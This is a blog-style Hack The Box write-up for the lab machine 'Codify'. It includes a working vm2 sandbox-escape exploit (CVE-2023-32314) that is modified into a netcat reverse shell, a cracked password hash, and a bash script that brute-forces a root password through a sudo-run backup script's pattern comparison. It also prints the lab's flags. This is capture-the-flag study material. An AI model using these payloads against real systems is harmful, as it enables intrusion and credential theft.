---
layout: post
title: HTB Codify Writeup
date: 2024-03-28 22:06:31.613347+06:00
author: animesh
toc: true
tags: ["CVE-2023-32314", "jail", "jsjail", "bash_pattern_compare"]
categories: ["Hackthebox"]
render_with_liquid: false
comments: true
image:
  path: /posts/htb-codify-writeup/images/Codify.png
  alt: HTB Codify
---

## Overview

Codify is an easy Linux machine that features a web application that allows users to test `Node.js` code. The application uses a vulnerable `vm2` library, which is leveraged to gain remote code execution. Enumerating the target reveals a `SQLite` database containing a hash which, once cracked, yields `SSH` access to the box. Finally, a vulnerable `Bash` script can be run with elevated privileges to reveal the `root` user's password, leading to privileged access to the machine.

![Codify.png](images/Codify.png)

**Name -** Codify

**IP -** 10.10.11.239

**Difficulty -** Easy

**OS -** Linux

**Points -** 20

## Information Gathering

### Port Scan

Basic Scan

```bash
Starting Nmap 7.80 ( https://nmap.org ) at 2024-03-28 22:13 +06
Nmap scan report for 10.10.11.239
Host is up (0.050s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp

Nmap done: 1 IP address (1 host up) scanned in 3.00 seconds
```

Version Scan

```bash
Starting Nmap 7.80 ( https://nmap.org ) at 2024-03-28 22:13 +06
Nmap scan report for 10.10.11.239
Host is up (0.053s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://codify.htb/
3000/tcp open  http    Node.js Express framework
|_http-title: Codify
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.60 seconds
```

### **HTTP Enumeration**
There are two ports open with HTTP servers. Let's first check port 80

![](images/Pasted%20image%2020240328232706.png)

Looks like it can run nodejs code. Initially I tried with normal payload and it was not working. Then I found the following article
[https://security.snyk.io/vuln/SNYK-JS-VM2-5537100](https://security.snyk.io/vuln/SNYK-JS-VM2-5537100)

![](images/Pasted%20image%2020240328232802.png)

The article features [CVE-2023-32314](https://www.cve.org/CVERecord?id=CVE-2023-32314) 

Also I got a PoC and that PoC worked.

```javascript
const { VM } = require("vm2");
const vm = new VM();

const code = `
  const err = new Error();
  err.name = {
    toString: new Proxy(() => "", {
      apply(target, thiz, args) {
        const process = args.constructor.constructor("return process")();
        throw process.mainModule.require("child_process").execSync("echo hacked").toString();
      },
    }),
  };
  try {
    err.stack;
  } catch (stdout) {
    stdout;
  }
`;

console.log(vm.run(code));
```

![](images/Pasted%20image%2020240328233328.png)

Now I changed the PoC a little bit to get a reverse shell.

```javascript
const { VM } = require("vm2");
const vm = new VM();

const code = `
  const err = new Error();
  err.name = {
    toString: new Proxy(() => "", {
      apply(target, thiz, args) {
        const process = args.constructor.constructor("return process")();
        throw process.mainModule.require("child_process").execSync("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.118 9001 >/tmp/f").toString();
      },
    }),
  };
  try {
    err.stack;
  } catch (stdout) {
    stdout;
  }
`;

console.log(vm.run(code));
```

The code worked and I got a reverse shell.

![](images/Pasted%20image%2020240328233635.png)

## Getting user.txt

From that svc user, I found a database file in /var/www/contact/tickets.db

![](images/Pasted%20image%2020240329000256.png)

The database contains the password hash of the user joshua - `$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2`

Hashcat was able to crack it after some time.

![](images/Pasted%20image%2020240329000527.png)

**Pass -** spongebob1

Using that pass, I was able to get the user flag - `426a34f735a00f1c9ee9557d7b70a8bd`

![](images/Pasted%20image%2020240329000954.png)
## Getting root.txt
The user joshua has the privilege of running the script (`/opt/scripts/mysql-backup.sh`) as root user.

![](images/Pasted%20image%2020240329001427.png)

The file contains the following code

```bash
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'
```

Now this is using bash pattern comparison `if [[ $DB_PASS == $USER_PASS ]]` and the `User_PASS` field is in our control. So, we can use `*` to brute force the password. I write the following script to make the life easy.

```bash
#!/bin/bash

COMMAND="sudo -u root /opt/scripts/mysql-backup.sh"
PRE=""

# Loop through the script multiple times
for attempt in {1..40}; do
    echo "Attempt $attempt:"
    valid_character=""

    # Loop through printable ASCII values (33-126)
    visited=0
    for ((i=33; i<=126; i++))
    do
        # Exclude specific characters '*', '\', and '?'
        if [ $i -eq 42 ] || [ $i -eq 92 ] || [ $i -eq 63 ]
        then
            continue
        else
            # Convert ASCII value to character
            input=$(printf "\\$(printf '%03o' $i)")
            input_with_star="$PRE$input*"
            # echo "Input: $input_with_star"

            # Execute the command with the current input
            result=$(echo -n "$input_with_star" | $COMMAND)
            
            # Check if result is not "Password confirmation failed!"
            if [[ "$result" != *"Password confirmation failed!"* ]]; then
                echo "Valid character found: $input"
                valid_character="$input"
                PRE="$PRE$input"
                visited=1
                break  # Exit the inner loop if a valid character is found
            fi
        fi
    done
    if [ $visited -eq 0 ]
    then
    echo "Password = $PRE"
    break
    fi
done
```

After running the code, I finally got the root password `kljh12k3jhaskjh12kjh3`

![](images/Pasted%20image%2020240329022001.png)

Using the password, I was able to get the root flag `85ba8ff1cec900c09438300d37f3078c`

![](images/Pasted%20image%2020240329022131.png)

## Flags

**user.txt -** 426a34f735a00f1c9ee9557d7b70a8bd

**root.txt -** 85ba8ff1cec900c09438300d37f3078c
